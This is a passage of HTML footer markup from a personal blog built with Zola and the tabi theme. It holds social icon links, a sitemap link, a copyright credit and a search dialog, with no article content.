src=https://rylie.moe/social_icons/steam.svg title=steam> </a><li><a class="nav-links no-hover-padding social" rel=" me" href=https://anilist.co/user/Lumi9> <img alt=anilist loading=lazy src=https://rylie.moe/social_icons/anilist.svg title=anilist> </a></ul></nav><nav class=nav-navs><small> <ul><li><a class="nav-links no-hover-padding" href=https://rylie.moe/sitemap.xml> sitemap </a></ul> </small></nav><div class=credits><small> <p><p>lumi’s trashcan © 2022-2025 lumi</p> Powered by <a href=https://www.getzola.org>Zola</a> & <a href=https://github.com/welpo/tabi>tabi</a> </small></div></section><div class="search-modal js" aria-labelledby=modalTitle id=searchModal role=dialog><h1 class=visually-hidden id=modalTitle>Search</h1><div id=modal-content><div id=searchBar><div aria-hidden=true class=search-icon><svg viewbox="0 -960 960 960" xmlns=http://www.w3.org/2000/svg><path d="M784-120 532-372q-30 24-69 38t-83 14q-109 0-184.5-75.5T120-580q0-109 75.5-184.5T380-840q109 0 184.5 75.5T640-580q0 44-14 83t-38 69l252 252-56 56ZM380-400q75 0 127.5-52.5T560-580q0-75-52.5-127.5T380-760q-75 0-127.5 52.5T200-580q0 75 52.5 127.5T380-400Z"/></svg></div><input aria-controls=results-container aria-expanded=false autocomplete=off id=searchInput placeholder=Search… role=combobox spellcheck=false><div class="close-icon interactive-icon" title="Clear search" id=clear-search role=button tabindex=0><svg viewbox="0 -960 960 960" xmlns=http://www.w3.org/2000/svg><path d="m256-200-56-56 224-224-224-224 56-56 224 224 224-224 56 56-224 224 224 224-56 56-224-224-224 224Z"/></svg></div></div><div id=results-container><div id=results-info><span id=zero_results> No results</span><span id=one_results> $NUMBER result</span><span id=many_results> $NUMBER results</span><span id=two_results> $NUMBER results</span><span id=few_results> $NUMBER results</span></div><div id=results role=listbox></div></div></div></div></footer>